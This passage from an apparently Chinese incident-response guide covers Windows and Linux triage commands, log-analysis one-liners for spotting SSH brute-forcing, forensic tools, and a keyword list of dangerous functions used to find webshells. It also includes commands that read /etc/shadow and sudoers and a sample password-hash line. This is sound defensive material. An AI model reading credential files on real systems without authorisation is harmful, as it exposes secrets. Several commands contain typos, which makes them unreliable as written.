findstr /m /i /s &quot;hello&quot; *.txt</span><br><span class="hljs-section">查看网络连接: netstat - ano</span><br><span class="hljs-section">操作系统的详细配置信息: systeminfo</span><br><span class="hljs-section">获取系统进程信息: Wmic process</span><br><span class="hljs-section">根据应用程序查找PID: wmic process where name=&quot;cmd.exe” get processid,executablepath,name</span><br><span class="hljs-section">根据PID查找应用程序: wmic process where processid=&quot;1” get executablepath,name</span><br><span class="hljs-section">获取系统进程信息:tasklist</span><br>对于要查询特定dll的调用情况，可以使用命令tasklist /m dll名称<br><span class="hljs-section">计算样本MD5: certutil -hashfile %样本文件名% MD5</span><br></code></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h3><p>病毒分析</p><p>病毒查杀</p><p>病毒动态</p><p>在线扫描</p><p>webshell 查杀</p><p><strong>PChunter</strong><br>系统信息监控工具，主要拿来看数字签名<br>黑色是微软认证的<br>粉红色是未认证的<br>红色是可疑进程</p><p><strong>Autoruns</strong><br>启动项、计划任务等动态监测工具</p><p><strong>Process Explorer</strong><br>应用程序监测工具<br>数据量很大，需要过滤</p><p><strong>TCPView</strong><br>其实就是 <code>netstat -ano</code> 的输出，但是可视化方便处理</p><p><strong>Microsoft Network Monitor</strong><br>很小的一个流量监控软件<br>安装完需要重启，可以监测单个程序进程</p><p><strong>D 盾</strong><br>查杀 webshell</p><p><strong>Everything</strong><br>快速查找文件和目录</p><p><strong>sysmon</strong><br>微软开发的系统监控工具，常用来判断挖矿后门等等</p><p><strong>火绒剑</strong></p><p><strong>威胁分析平台</strong></p><p><strong>BeaconEye</strong><br>监测 CS 木马后门特征</p><p><strong>DumpIt</strong><br>内存取证工具，需要 dump 整个系统，取证空间占用太大，不建议使用<br>替代工具:<code>FTK Imager</code> 和 <code>WinPMem</code></p><p><strong>Volatility</strong><br>内存取证工具</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><p>账号安全，历史命令，异常端口，开机启动、服务，异常文件，&#x2F;tmp&#x2F;user&#x2F;bin 目录、进程</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**top和ps aux**</span><br>查看系统资源占用<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**netstat -antpl**</span><br>查看网络连接以及其对应可执行程序<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**lsof**</span><br>查看开放端口的进程<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">**登录信息查看**<br><span class="hljs-section">显示错误的尝试登录信息: lastb</span><br><span class="hljs-section">显示系统用户最近的登录信息: last</span><br><span class="hljs-section">现实所有的用户最近的登录信息: lastlog</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">**<span class="hljs-keyword">grep</span>**<br>查找符合条件的字符串:netstat -antpl <span class="hljs-keyword">lgrep</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">**crontab**<br>查看定时任务: crontab -<span class="hljs-number">1</span> 、 cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">**历史命令**<br>查看历史命令: <span class="hljs-built_in">history</span>、<span class="hljs-built_in">cat</span> ~/.bash <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">**校验RPM软件包**<br><span class="hljs-section">校验RPM软件包: rpm -Va、dpkg -verify</span><br>S：表示对应文件的大小 (Size) 不一致<br><span class="hljs-section">M: 表示对于文件的mode不一致</span><br><span class="hljs-section">5:表示对应文件的MD5不一致</span><br><span class="hljs-section">D:表示文件的major和minor号不一致</span><br><span class="hljs-section">L:表示文件的符号连接内容不一致</span><br><span class="hljs-section">U:表示文件的owner不一致</span><br><span class="hljs-section">G: 表示文件的group不一致</span><br><span class="hljs-section">T:表示文件的修改时间不一致</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">**其它**<br>登录成功的IP<br>grep “Accepted” /var/log/secure | awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$11</span>&#125;’ | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br>定位有爆破行为的IP<br>grep “Failed password” /var/log/secure awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$11</span>&#125;’ | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br>查看隐藏进程<br>ps -ef awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$11</span>&#125;’ | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> &gt;1<br><span class="hljs-built_in">ls</span> /proc | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> &gt;2<br>diff 1 2<br></code></pre></td></tr></table></figure><h3 id="账号安全-1"><a href="#账号安全-1" class="headerlink" title="账号安全"></a>账号安全</h3><p><strong>基本使用：</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">解释<br><span class="hljs-number">1</span>、用户信息文件/etc/passwd<br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">account:</span><span class="hljs-symbol">password:</span><span class="hljs-variable constant_">UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:GECOS</span><span class="hljs-symbol">:directory</span><span class="hljs-symbol">:shell</span><br>用户名：密码：用户<span class="hljs-variable constant_">ID</span>：组<span class="hljs-variable constant_">ID</span>：用户说明：家目录：登陆之后shell<br>注意：无密码只允许本机登陆，远程不允许登陆<br><span class="hljs-number">2</span>、影子文件/etc/shadow<br><span class="hljs-symbol">root:</span>$<span class="hljs-number">6</span><span class="hljs-variable">$oGs1PqhL2p</span>3ZetrE<span class="hljs-variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.<span class="hljs-title class_">Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVv</span>I/<span class="hljs-symbol">:</span><span class="hljs-number">16809</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">99999</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:<br>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>     查看当前登录用户（<span class="hljs-built_in">tty</span>本地登陆  pts远程登录）<br>w       查看系统信息，想知道某一时刻用户的行为<br><span class="hljs-built_in">uptime</span>  查看登陆多久、多少用户，负载<br></code></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">解释<br><span class="hljs-number">1</span>、查询特权用户特权用户(uid 为<span class="hljs-number">0</span>)<br>[root@localhost ~]# awk -F: <span class="hljs-string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br><span class="hljs-number">2</span>、查询可以远程登录的帐号信息<br>[root@localhost ~]# awk <span class="hljs-string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> <span class="hljs-regexp">/etc/</span>shadow<br><span class="hljs-number">3</span>、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限<br>[root@localhost ~]# more <span class="hljs-regexp">/etc/</span>sudoers | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;^#\|^$&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;ALL=(ALL)&quot;</span><br><span class="hljs-number">4</span>、禁用或删除多余及可疑的帐号<br>    usermod -L user    禁用帐号，帐号无法登录，<span class="hljs-regexp">/etc/</span>shadow第二栏为!开头<br>    userdel user       删除user用户<br>    userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除<br></code></pre></td></tr></table></figure><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><p><strong>基本使用：</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs clean">解释<br>通过.bash_history查看帐号执行过的系统命令<br><span class="hljs-number">1</span>、root的历史命令<br>histroy<br><span class="hljs-number">2</span>、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令<br>为历史的命令增加登录的IP地址、执行命令时间等信息：<br><span class="hljs-number">1</span>）保存<span class="hljs-number">1</span>万条命令<br>sed -i <span class="hljs-string">&#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27;</span> /etc/profile<br><span class="hljs-number">2</span>）在/etc/profile的文件尾部添加如下行数配置信息：<br>######jiagu history xianshi#########<br>USER_IP=`who -u am i <span class="hljs-number">2</span>&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="hljs-string">&#x27;s/[()]//g&#x27;</span>`<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$USER_IP&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ]<br>then<br>USER_IP=`hostname`<br>fi<br><span class="hljs-keyword">export</span> HISTTIMEFORMAT=<span class="hljs-string">&quot;%F %T $USER_IP `whoami` &quot;</span><br>shopt -s histappend<br><span class="hljs-keyword">export</span> PROMPT_COMMAND=<span class="hljs-string">&quot;history -a&quot;</span><br>######### jiagu history xianshi ##########<br><span class="hljs-number">3</span>）source /etc/profile让配置生效<br>生成效果： <span class="hljs-number">1</span>  <span class="hljs-number">2018</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">19</span>:<span class="hljs-number">45</span>:<span class="hljs-number">39</span> <span class="hljs-number">192.168</span><span class="hljs-number">.204</span><span class="hljs-number">.1</span> root source /etc/profile<br><span class="hljs-number">3</span>、历史操作命令的清除：history -c<br>但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。<br></code></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">进入用户目录下<br>cat <span class="hljs-string">.bash_history</span> &gt;&gt; <span class="hljs-keyword">history</span>.txt<br></code></pre></td></tr></table></figure><h3 id="异常端口"><a href="#异常端口" class="headerlink" title="异常端口"></a>异常端口</h3><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">netstat -antlp|more<br>查看下pid所对应的进程文件路径，<br>运行ls -l <span class="hljs-regexp">/proc/</span><span class="hljs-variable">$PID</span><span class="hljs-regexp">/exe或file /</span>proc<span class="hljs-regexp">/$PID/</span>exe（<span class="hljs-variable">$PID</span> 为对应的pid 号）<br></code></pre></td></tr></table></figure><h3 id="异常进程"><a href="#异常进程" class="headerlink" title="异常进程"></a>异常进程</h3><p>使用 ps 命令，分析进程</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> pid<br></code></pre></td></tr></table></figure><h3 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h3><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><p>查看运行级别命令 runlevel</p><p>系统默认允许级别</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">vi  /etc/inittab<br><span class="hljs-attribute">id</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>：initdefault  系统开机后直接进入哪个运行级别<br></code></pre></td></tr></table></figure><p>开机启动配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>rc.local<br><span class="hljs-regexp">/etc/</span>rc.d/rc[<span class="hljs-number">0</span>~<span class="hljs-number">6</span>].d<br></code></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在&#x2F;etc&#x2F;init.d 目录下，然后在&#x2F;etc&#x2F;rc.d&#x2F;rc*.d 中建立软链接即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">root@localhost ~]# ln -s <span class="hljs-regexp">/etc/i</span>nit.d<span class="hljs-regexp">/sshd /</span>etc<span class="hljs-regexp">/rc.d/</span>rc3.d/S100ssh<br></code></pre></td></tr></table></figure><p>此处 sshd 是具体服务的脚本文件，S100ssh 是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">more <span class="hljs-regexp">/etc/</span>rc.local <span class="hljs-regexp">/etc/</span>rc.d/rc[<span class="hljs-number">0</span>~<span class="hljs-number">6</span>].d <br><br>ls -l <span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/rc3.d/</span><br></code></pre></td></tr></table></figure><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l 列出某个用户 cron 服务的详细内容</p><p>Tips：默认编写的 crontab 文件会保存在 (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><p>crontab -r 删除每个用户 cront 任务(谨慎：删除所有的计划任务)</p><p>crontab -e 使用编辑器编辑当前的 crontab 文件</p><p>如：_&#x2F;1 _* echo “hello world” &gt;&gt; &#x2F;tmp&#x2F;test.txt 每分钟写入文件</p><p>2、利用 anacron 实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 &#x2F;home&#x2F;backup.sh 脚本： vi &#x2F;etc&#x2F;anacrontab @daily 10 example.daily &#x2F;bin&#x2F;bash &#x2F;home&#x2F;backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron 会在机器开机十分钟之后运行它，而不用再等待 7 天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">解释<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>* <br><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.d/*<br><span class="hljs-regexp">/etc/</span>cron.daily/* <br><span class="hljs-regexp">/etc/</span>cron.hourly/* <br><span class="hljs-regexp">/etc/</span>cron.monthly/*<br><span class="hljs-regexp">/etc/</span>cron.weekly/<br><span class="hljs-regexp">/etc/</span>anacrontab<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>*<br></code></pre></td></tr></table></figure><p>小技巧：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">more <span class="hljs-regexp">/etc/</span>cron.daily/*  查看目录下所有文件<br></code></pre></td></tr></table></figure><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chkconfig</span><span class="hljs-meta"> [--level 运行级别] [独立服务名] [on|off]</span><br><span class="hljs-attribute">chkconfig</span> –level  <span class="hljs-number">2345</span> httpd <span class="hljs-literal">on</span>  开启自启动<br><span class="hljs-attribute">chkconfig</span> httpd <span class="hljs-literal">on</span> （默认level是<span class="hljs-number">2345</span>）<br></code></pre></td></tr></table></figure><p>第二种修改方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">修改<span class="hljs-regexp">/etc/</span>re.d/rc.local 文件  <br>加入 <span class="hljs-regexp">/etc/i</span>nit.d/httpd start<br></code></pre></td></tr></table></figure><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">解释<br>chkconfig  --<span class="hljs-keyword">list</span>  查看服务自启动状态，可以看到所有的RPM包安装的服务<br><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> crond 查看当前服务<br>系统在<span class="hljs-number">3</span>与<span class="hljs-number">5</span>级别下的启动项 <br>中文环境<br>chkconfig --<span class="hljs-keyword">list</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;3:启用\|5:启用&quot;</span><br>英文环境<br>chkconfig --<span class="hljs-keyword">list</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;3:on\|5:on&quot;</span><br></code></pre></td></tr></table></figure><p>源码包安装的服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看服务安装位置 ，一般是在<span class="hljs-regexp">/user/</span>local/<br>service httpd start<br>搜索<span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>  查看是否存在<br></code></pre></td></tr></table></figure><h3 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h3><p>1、查看敏感目录，如&#x2F;tmp 目录下的文件，同时注意隐藏文件夹，以“.*”为名的文件夹具有隐藏属性</p><p>2、得到发现 WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>可以使用 find 命令来查找，如 <code> find /opt -iname &quot;*&quot; -atime 1 -type f</code> 找出 &#x2F;opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">定位有多少IP在爆破主机的root帐号：    <br>grep <span class="hljs-string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br><br>定位有哪些IP在爆破：<br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="hljs-string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|<span class="hljs-built_in">uniq</span> -c<br><br>爆破用户名字典是什么？<br> grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br><br>登录成功的IP有哪些：     <br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br><br>登录成功的日期、用户名、IP：<br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> <br><br>增加一个用户kali日志：<br>Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001<br>Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bash<br>Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="hljs-keyword">for</span> kali<br><span class="hljs-comment">#grep &quot;useradd&quot; /var/log/secure </span><br><br>删除用户kali日志：<br>Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="hljs-string">&#x27;kali&#x27;</span><br>Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="hljs-string">&#x27;kali&#x27;</span> owned by <span class="hljs-string">&#x27;kali&#x27;</span><br>Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="hljs-string">&#x27;kali&#x27;</span> owned by <span class="hljs-string">&#x27;kali&#x27;</span><br>grep <span class="hljs-string">&quot;userdel&quot;</span> /var/log/secure<br><br>su切换用户：<br>Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="hljs-keyword">for</span> user good by root(uid=0)<br><br>sudo授权执行<br>sudo -l<br><br>列出当天访问次数最多的IP命令：<br><span class="hljs-built_in">cut</span> -d- -f 1 log_file|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20<br><br>查看当天有多少个IP访问：<br>awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> log_file|<span class="hljs-built_in">sort</span>|<span class="hljs-built_in">uniq</span>|<span class="hljs-built_in">wc</span> -l<br><br>查看某一个页面被访问的次数：<br>grep <span class="hljs-string">&quot;/index.php&quot;</span> log_file | <span class="hljs-built_in">wc</span> -l<br><br>查看每一个IP访问了多少个页面：<br>awk <span class="hljs-string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27;</span> log_file<br><br>将每个IP访问的页面数进行从小到大排序：<br>awk <span class="hljs-string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27;</span> log_file | <span class="hljs-built_in">sort</span> -n<br><br>查看某一个IP访问了哪些页面：<br>grep ^111.111.111.111 log_file| awk <span class="hljs-string">&#x27;&#123;print $1,$7&#125;&#x27;</span><br><br>去掉搜索引擎统计当天的页面：<br>awk <span class="hljs-string">&#x27;&#123;print $12,$1&#125;&#x27;</span> log_file | grep ^\&quot;Mozilla | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-built_in">wc</span> -l<br><br>查看2018年6月21日14时这一个小时内有多少IP访问:<br>awk <span class="hljs-string">&#x27;&#123;print $4,$1&#125;&#x27;</span> log_file | grep 21/Jun/2018:14 | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>| <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><h3 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a><strong>应急工具</strong></h3><p><strong>BusyBox</strong><br>静态链接库的 BusyBox<br>当命令被替换时使用<br>赋予可执行权限后.\即可</p><p><strong>chkrootkit</strong><br>监测 RootKit 的脚本</p><p><strong>Rkhunter</strong><br>同上</p><p><strong>unhide</strong><br>查找隐藏的 UDP&#x2F;TCP 进程</p><p><strong>ClamAV</strong><br>检测各种恶意木马，病毒，进程<br>注意是否存在 so 文件的注入</p><p><strong>河马 Webshell</strong></p><p><strong>RPM 包</strong></p><p><strong>查找文件中的恶意&#x2F;危险函数</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">PHP</span>: <span class="hljs-function"><span class="hljs-title">eval</span>(、<span class="hljs-title">system</span>(、<span class="hljs-variable">assert</span> (</span><br><span class="hljs-function"><span class="hljs-variable">JSP</span>: <span class="hljs-title">getRunTime</span>(、<span class="hljs-title">FileOutputStream</span>(</span><br><span class="hljs-function"><span class="hljs-variable">ASP</span>: <span class="hljs-title">eval</span>(、<span class="hljs-title"><span class="hljs-built_in">execute</span></span>(、<span class="hljs-variable">ExecuteGlobal</span> (</span><br></code></pre></td></tr></table></figure><p><strong>从日志记录中查找</strong><br>查看每个 IP 地址访问次数:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c<br>访问 URL 排序:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c |sort -rn|head<br>访问指定资源日志:<br>cat 